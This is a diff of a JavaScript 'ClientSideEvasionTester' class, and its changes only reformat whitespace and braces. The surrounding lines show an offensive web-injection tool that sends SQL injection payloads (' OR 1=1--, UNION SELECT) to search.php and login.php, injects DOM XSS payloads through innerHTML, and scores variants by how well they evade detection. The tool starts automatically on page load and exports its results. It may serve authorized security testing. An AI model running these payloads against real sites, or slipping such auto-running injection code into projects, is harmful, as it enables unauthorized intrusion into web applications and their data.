@@ -104,7 +104,7 @@ class ClientSideEvasionTester {
                 description: 'WebSocket message injection',
                 evaded: {
                     json_escape: '{"cmd":"search","query":"\\u0027 OR 1=1--"}',
-                    double_json: JSON.stringify({"cmd":"search","query":"' OR 1=1--"}),
+                    double_json: JSON.stringify({ "cmd": "search", "query": "' OR 1=1--" }),
                     fragmented: '{"cmd":"sear"+"ch","query":"\\x27 OR 1=1--"}'
                 }
             }
@@ -128,7 +128,7 @@ class ClientSideEvasionTester {
 
                 try {
                     testDiv.innerHTML = payload;
-                    
+
                     // Test script execution
                     const scripts = testDiv.querySelectorAll('script');
                     scripts.forEach(script => {
@@ -179,10 +179,10 @@ class ClientSideEvasionTester {
             const xhr = new XMLHttpRequest();
             const startTime = Date.now();
 
-            xhr.onreadystatechange = function() {
+            xhr.onreadystatechange = function () {
                 if (xhr.readyState === 4) {
                     const responseTime = Date.now() - startTime;
-                    
+
                     resolve({
                         status: xhr.status,
                         response_time: responseTime,
@@ -195,7 +195,7 @@ class ClientSideEvasionTester {
                 }
             };
 
-            xhr.onerror = function() {
+            xhr.onerror = function () {
                 resolve({ error: 'Network error' });
             };
 
@@ -214,10 +214,10 @@ class ClientSideEvasionTester {
             const xhr = new XMLHttpRequest();
             const startTime = Date.now();
 
-            xhr.onreadystatechange = function() {
+            xhr.onreadystatechange = function () {
                 if (xhr.readyState === 4) {
                     const responseTime = Date.now() - startTime;
-                    
+
                     resolve({
                         status: xhr.status,
                         response_time: responseTime,
@@ -228,14 +228,14 @@ class ClientSideEvasionTester {
                 }
             };
 
-            xhr.onerror = function() {
+            xhr.onerror = function () {
                 resolve({ error: 'Network error' });
             };
 
             try {
                 xhr.open('POST', `${this.baseUrl}/${endpoint}`, true);
                 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                
+
                 const formData = `username=${encodeURIComponent(payload)}&password=test123`;
                 xhr.send(formData);
             } catch (error) {
@@ -279,7 +279,7 @@ class ClientSideEvasionTester {
     // Run comprehensive client-side tests
     async runComprehensiveTest() {
         console.log('🚀 Starting Client-Side Evasion Testing...');
-        
+
         const results = {
             dom_xss_tests: {},
             ajax_tests: {},
@@ -297,18 +297,18 @@ class ClientSideEvasionTester {
         // Test DOM-based XSS
         console.log('🎯 Testing DOM-based XSS...');
         const domPayloads = this.generateDOMXSSPayloads();
-        
+
         for (const [payloadName, payloadData] of Object.entries(domPayloads)) {
             results.dom_xss_tests[payloadName] = {};
-            
+
             for (const [variantName, payload] of Object.entries(payloadData.evaded)) {
                 console.log(`  Testing ${payloadName} - ${variantName}...`);
-                
+
                 const domResult = await this.testDOMManipulation(payload);
                 const evasionAnalysis = this.analyzeDetectionEvasion(payload);
-                
+
                 evasionScores.push(evasionAnalysis.evasion_percentage);
-                
+
                 if (evasionAnalysis.evasion_percentage > 80) {
                     results.summary.high_evasion_count++;
                 }
@@ -331,18 +331,18 @@ class ClientSideEvasionTester {
         // Test AJAX injections
         console.log('🎯 Testing AJAX-based injections...');
         const ajaxPayloads = this.generateClientSQLTests();
-        
+
         for (const [payloadName, payloadData] of Object.entries(ajaxPayloads)) {
             results.ajax_tests[payloadName] = {};
-            
+
             for (const [variantName, payload] of Object.entries(payloadData.evaded)) {
                 console.log(`  Testing ${payloadName} - ${variantName}...`);
-                
+
                 const ajaxResult = await this.testAJAXInjection('search.php', payload);
                 const evasionAnalysis = this.analyzeDetectionEvasion(payload);
-                
+
                 evasionScores.push(evasionAnalysis.evasion_percentage);
-                
+
                 if (evasionAnalysis.evasion_percentage > 80) {
                     results.summary.high_evasion_count++;
                 }
@@ -365,13 +365,13 @@ class ClientSideEvasionTester {
         // Test POST injections
         console.log('🎯 Testing POST-based injections...');
         const postPayloads = ["' OR '1'='1'--", "admin'/**/OR/**/1=1--", "' UNION SELECT null,null,null--"];
-        
+
         for (const payload of postPayloads) {
             const postResult = await this.testPOSTInjection('login.php', payload);
             const evasionAnalysis = this.analyzeDetectionEvasion(payload);
-            
+
             evasionScores.push(evasionAnalysis.evasion_percentage);
-            
+
             if (evasionAnalysis.evasion_percentage > 80) {
                 results.summary.high_evasion_count++;
             }
@@ -424,7 +424,7 @@ class ClientSideEvasionTester {
 
         const summary = results.summary;
         const successRate = Math.round((summary.successful_executions / summary.total_tests) * 100);
-        
+
         let html = `
             <h3 style="color: #ff6b6b; margin: 0 0 15px 0;">🥷 CLIENT-SIDE EVASION RESULTS</h3>
             <div style="margin-bottom: 15px;">
@@ -448,7 +448,7 @@ class ClientSideEvasionTester {
 
         // Top successful payloads
         html += '<div style="margin-top: 15px;"><strong>🔥 TOP EVASIONS:</strong><br>';
-        
+
         let allTests = [];
         ['dom_xss_tests', 'ajax_tests', 'post_tests'].forEach(category => {
             Object.entries(results[category]).forEach(([name, variants]) => {
@@ -469,13 +469,13 @@ class ClientSideEvasionTester {
         allTests.sort((a, b) => b.score - a.score);
         allTests.slice(0, 5).forEach((test, i) => {
             html += `<div style="margin: 5px 0; color: #ffff00;">
-                ${i+1}. ${test.name} (${test.score}%)<br>
+                ${i + 1}. ${test.name} (${test.score}%)<br>
                 <span style="color: #cccccc; font-size: 10px;">${test.payload.substring(0, 50)}...</span>
             </div>`;
         });
 
         html += '</div>';
-        
+
         // Close button
         html += `
             <button onclick="document.body.removeChild(document.getElementById('evasion-test-results'))" 
@@ -491,9 +491,9 @@ class ClientSideEvasionTester {
     // Export results to JSON
     exportResults(results) {
         const dataStr = JSON.stringify(results, null, 2);
-        const dataBlob = new Blob([dataStr], {type: 'application/json'});
+        const dataBlob = new Blob([dataStr], { type: 'application/json' });
         const url = URL.createObjectURL(dataBlob);
-        
+
         const link = document.createElement('a');
         link.href = url;
         link.download = `client_evasion_results_${Date.now()}.json`;
@@ -505,27 +505,27 @@ class ClientSideEvasionTester {
 }
 
 // Auto-start testing when page loads
-window.addEventListener('load', async function() {
+window.addEventListener('load', async function () {
     // Only run on pages with testing capability
-    if (window.location.pathname.includes('test') || 
+    if (window.location.pathname.includes('test') ||
         window.location.search.includes('auto_test=1')) {
-        
+
         console.log('🥷 Auto-starting client-side evasion testing...');
-        
+
         const tester = new ClientSideEvasionTester(window.location.origin + '/Musywar');
-        
+
         try {
             const results = await tester.runComprehensiveTest();
             console.log('✅ Client-side testing completed!', results);
-            
+
             // Display results
             tester.displayResults(results);
-            
+
             // Auto-export results
             setTimeout(() => {
                 tester.exportResults(results);
             }, 1000);
-            
+
         } catch (error) {
             console.error('❌ Client-side testing failed:', error);
         }
@@ -533,7 +533,7 @@ window.addEventListener('load', async function() {
 });
 
 // Manual testing trigger
-window.runClientEvasionTest = async function() {
+window.runClientEvasionTest = async function () {
     const tester = new ClientSideEvasionTester(window.location.origin + '/Musywar');
     const results = await tester.runComprehensiveTest();
     tester.displayResults(results);
